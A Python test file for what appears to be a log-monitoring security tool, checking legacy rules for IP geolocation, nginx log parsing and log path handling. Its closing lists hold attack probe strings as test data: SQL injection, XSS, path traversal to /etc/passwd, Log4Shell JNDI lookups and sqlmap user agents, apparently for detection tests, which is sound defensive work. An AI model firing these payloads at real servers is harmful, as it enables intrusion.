"""Rules of the old system kept in rules.py (TRD §4.1, §9.2).

(a) contents of the old system's demo(); (b) sample inputs with known results.
"""
import os, re

from monishield.domain import rules
from monishield.infrastructure import refdata

FE_UA = re.compile(r'" \d{3} \d+ "[^"]*" "([^"]*)" "')  # User-Agent in the frontend access log


# ------------------------------------------------------------------ (a) old demo()
def _ranges(rows):
    """DB-IP CSV rows -> refdata.sweep() ranges (IPv4 only, as the old geo_scan read them)."""
    return [(rules.ip_int(r[0]), rules.ip_int(r[1]), [r[5], r[4], r[3], float(r[6]), float(r[7])]) for r in rows if ':' not in r[0]]


def test_demo_geo_scan():
    rows = [['1.0.0.0', '1.0.0.255', 'OC', 'AU', 'Queensland', 'Brisbane', '-27.5', '153.0'],
            ['1.0.2.0', '1.0.2.255', 'AS', 'ID', 'Jakarta', 'Jakarta', '-6.2', '106.8'], ['2001::', '2001::1', '', '', '', '', '0', '0']]
    need = sorted((rules.ip_int(i), i) for i in ('1.0.0.7', '1.0.1.9', '1.0.2.255', '9.9.9.9'))
    assert refdata.sweep(need, _ranges(rows)) == {'1.0.0.7': ['Brisbane', 'Queensland', 'AU', -27.5, 153.0], '1.0.1.9': None,
                                          '1.0.2.255': ['Jakarta', 'Jakarta', 'ID', -6.2, 106.8], '9.9.9.9': None}


def test_demo_kab_name():
    assert (rules.kab_name('Kabupaten Bogor'), rules.kab_name('Gresik Regency'), rules.kab_name('Kota Sabang')) == ('Kab. Bogor', 'Kab. Gresik', 'Kota Sabang')


def test_demo_nginx_line_with_retry():
    """demo() sample lines: patterns match and the answering pod = last address (its parser is tested in Stage 3)."""
    line = ('1.2.3.4 - - [04/Oct/2026:17:00:34 +0000] "GET / HTTP/1.1" 200 6599 "-" "x" 355 0.001 '
            '[web-frontend-3000] [] 10.42.1.1:3000, 10.42.2.2:3000 0, 6599 0.000, 0.001 502, 200 ' + 'a' * 32)
    m = rules.NGINX.match(line); tm = rules.NGX_TAIL.search(line.rstrip())
    assert m.group(1, 6, 7, 8, 12) == ('1.2.3.4', 'GET', '/', '200', 'web-frontend-3000')
    assert tm[1].replace(', ', ',').split(' ')[0].split(',')[-1] == '10.42.2.2:3000' and tm[2] == 'a' * 32


def test_file_scan():
    assert rules.pod_name('report-service', 'log_report-service_report-service-866586bb75-bqfd6_2026-09-26-00-00.log') == 'report-service-866586bb75-bqfd6'
    assert rules.split_relpath(os.path.join('2026-09-29', 'tenant', 'report-service', 'a.log.gz')) == ('2026-09-29', 'tenant', 'report-service', 'a.log')
    assert rules.split_relpath(os.path.join('2026-09-26', 'report-service', 'a.log')) == ('2026-09-26', '-', 'report-service', 'a.log')
    assert rules.split_relpath(os.path.join('recovery-file', 'x', 'a.log')) is None
    assert rules.split_relpath(os.path.join('2026-09-26', 'a.log')) is None


# ------------------------------------------------------------------ (b) definitions exactly the same


# ------------------------------------------------------------------ (c) same results on real input


ATTACKS = ["/?id=1 union select 1,2", "/x?q=%2527%2520or%25201", "/<script>alert(1)</script>", "/a/../../etc/passwd", "/${jndi:ldap://x/a}",
            "/.env", "/.git/config", "/wp-login.php", "/index.php", "/cgi-bin/test.cgi", "/backup.sql", "/actuator/health", "/aman/saja"]
TEST_UAS = ["sqlmap/1.7", "curl/8.1", "python-requests/2.31", "${jndi:ldap://x}", "Mozilla/5.0 (Instagram 1; id; x)", "Uptime-Kuma/2.0.2", "-"]


